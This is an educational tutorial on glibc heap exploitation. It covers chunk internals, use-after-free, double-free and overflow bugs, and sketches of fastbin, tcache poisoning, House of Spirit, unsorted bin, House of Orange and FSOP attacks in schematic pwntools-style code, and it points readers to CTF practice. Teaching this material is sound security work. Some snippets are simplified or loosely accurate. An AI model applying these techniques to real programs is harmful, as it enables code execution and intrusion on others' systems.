# Heap Exploitation

Heap exploitation targets dynamic memory allocation mechanisms to achieve arbitrary code execution. Unlike stack-based vulnerabilities, heap exploitation involves manipulating heap metadata and allocation algorithms.

## Understanding the Heap

The heap is a memory region used for dynamic memory allocation through functions like `malloc()`, `calloc()`, `realloc()`, and `free()`.

### Heap Allocators

**glibc malloc (ptmalloc2)**
```c
// Basic heap operations
void *ptr = malloc(64);    // Allocate 64 bytes
free(ptr);                 // Free the memory
ptr = NULL;                // Prevent use-after-free
```

**Key Data Structures:**
- **Chunks**: Basic allocation units containing metadata and user data
- **Bins**: Lists organizing free chunks by size
- **Arena**: Memory region containing heap chunks

### Chunk Structure

```c
struct malloc_chunk {
    size_t prev_size;      // Size of previous chunk if free
    size_t size;           // Size of this chunk + flags
    struct malloc_chunk *fd;   // Forward pointer (free chunks)
    struct malloc_chunk *bk;   // Backward pointer (free chunks)
    // User data follows...
};
```

## Common Heap Vulnerabilities

### Use-After-Free (UAF)

Accessing memory after it has been freed can lead to arbitrary code execution.

```c
// Vulnerable code
char *buffer = malloc(64);
strcpy(buffer, user_input);
free(buffer);
// buffer is freed but pointer still exists

// Later in code...
printf("Data: %s\n", buffer);  // Use-after-free!
```

**Exploitation Steps:**
1. Free a chunk containing function pointers
2. Allocate new chunk with controlled data
3. Trigger use of freed chunk to execute controlled data

### Double Free

Freeing the same chunk twice corrupts heap metadata.

```c
// Vulnerable code
free(ptr);
// ... some code ...
free(ptr);  // Double free vulnerability!
```

### Heap Buffer Overflow

Overflowing heap buffers can corrupt adjacent chunk metadata.

```c
// Vulnerable code
char *buf1 = malloc(64);
char *buf2 = malloc(64);
strcpy(buf1, very_long_string);  // Overflows into buf2's metadata
```

## Exploitation Techniques

### Fastbin Attack

Exploits the fastbin mechanism for small chunk allocations.

```python
# pwntools exploitation example
from pwn import *

# 1. Allocate chunks in fastbin range (< 128 bytes)
malloc(0, 64)  # chunk A
malloc(1, 64)  # chunk B

# 2. Free chunks to populate fastbin
free(0)  # A -> fastbin
free(1)  # B -> A -> fastbin

# 3. Double free to corrupt fastbin
free(0)  # A -> B -> A (corrupted fastbin)

# 4. Allocate with fake chunk address
fake_chunk = target_address - 8  # Account for chunk header
malloc(2, 64, fake_chunk)  # Points fastbin to fake chunk

# 5. Allocate to get arbitrary write
malloc(3, 64)  # Returns address near target
```

### Tcache Poisoning (glibc >= 2.26)

Tcache (thread local cache) provides per-thread chunk caching.

```python
# Tcache poisoning example
def tcache_poison():
    # 1. Fill tcache for specific size
    chunks = []
    for i in range(7):  # Tcache holds max 7 chunks
        chunks.append(malloc(64))
    
    for chunk in chunks:
        free(chunk)
    
    # 2. Free one more to bypass tcache
    victim = malloc(64)
    free(victim)
    
    # 3. Create fake chunk
    fake_chunk = target_address
    
    # 4. Overwrite tcache entry
    edit(victim, p64(fake_chunk))
    
    # 5. Allocate to get arbitrary address
    malloc(64)  # Normal allocation
    evil_chunk = malloc(64)  # Returns fake_chunk address
    
    return evil_chunk
```

### House of Spirit

Creates a fake chunk in a controlled memory region.

```python
def house_of_spirit():
    # 1. Create fake chunk on stack or in data section
    fake_chunk = b""
    fake_chunk += p64(0)        # prev_size (unused)
    fake_chunk += p64(0x71)     # size (must be valid)
    fake_chunk += b"A" * 0x60   # fake data
    fake_chunk += p64(0x70)     # next chunk's prev_size
    
    # 2. Get pointer to fake chunk
    fake_ptr = stack_address + 8  # Skip prev_size
    
    # 3. Free the fake chunk
    free_function(fake_ptr)
    
    # 4. Allocate to get fake chunk back
    controlled_chunk = malloc(0x68)
    
    return controlled_chunk
```

### Unsorted Bin Attack

Exploits the unsorted bin to achieve arbitrary write.

```python
def unsorted_bin_attack():
    # 1. Allocate large chunk (> fastbin size)
    chunk_a = malloc(0x100)
    
    # 2. Allocate another chunk to prevent consolidation
    guard = malloc(0x100)
    
    # 3. Free chunk A (goes to unsorted bin)
    free(chunk_a)
    
    # 4. Overwrite chunk A's bk pointer
    target = target_address - 0x10  # Account for unsorted bin structure
    edit(chunk_a + 8, p64(main_arena + 88) + p64(target))
    
    # 5. Allocate to trigger unsorted bin removal
    malloc(0x100)  # Writes main_arena address to target
```

## Advanced Heap Techniques

### House of Orange

Exploits `_IO_FILE` structures when no `free()` function is available.

```python
def house_of_orange():
    # 1. Overflow top chunk size
    overflow_top_chunk_size(0x1)
    
    # 2. Trigger malloc_printerr through _IO_flush_all_lockp
    large_malloc = malloc(0x1000)
    
    # 3. Craft fake _IO_FILE structure
    fake_file = craft_io_file_structure()
    
    # 4. Overwrite stderr pointer
    overwrite_stderr(fake_file)
    
    # 5. Trigger error to execute crafted vtable
    trigger_error()
```

### FSOP (File Stream Oriented Programming)

Exploits `_IO_FILE` structures for code execution.

```python
def fsop_exploit():
    # 1. Leak libc addresses
    libc_base = leak_libc()
    system_addr = libc_base + system_offset
    
    # 2. Craft fake _IO_FILE
    fake_file = b""
    fake_file += p64(0)  # _flags
    fake_file += p64(0)  # _IO_read_ptr
    # ... craft complete structure
    
    # 3. Overwrite _IO_list_all or stderr
    overwrite_io_structure(fake_file)
    
    # 4. Trigger through malloc_printerr or exit
    trigger_fsop()
```

## Heap Debugging Tools

### GDB with pwndbg/peda

```bash
# Heap analysis commands
(gdb) heap
(gdb) bins
(gdb) tcache
(gdb) fastbins
(gdb) unsorted_bin
```

### Heap Visualization

```python
# pwntools heap debugging
def debug_heap():
    gdb.attach(p, """
        set environment LD_PRELOAD=./libc.so.6
        b malloc
        b free
        c
    """)
```

## Mitigation Bypasses

### ASLR Bypass
- Heap spraying
- Information leaks
- Relative overwrites

### Heap Protection Bypass
- Double free detection bypass
- Metadata corruption
- Tcache key validation bypass

## Key Takeaways

1. **Understand heap internals**: Know how your target allocator works
2. **Control allocation patterns**: Manipulate heap layout through allocation/free sequences
3. **Exploit metadata corruption**: Target chunk headers and bin structures
4. **Chain primitives**: Combine heap vulnerabilities with other techniques
5. **Adapt to mitigations**: Modern heaps have extensive protections that require sophisticated bypasses
6. **Practice with CTF challenges**: Build intuition through hands-on exploitation

Heap exploitation requires deep understanding of memory allocator internals and careful manipulation of heap state to achieve reliable code execution.
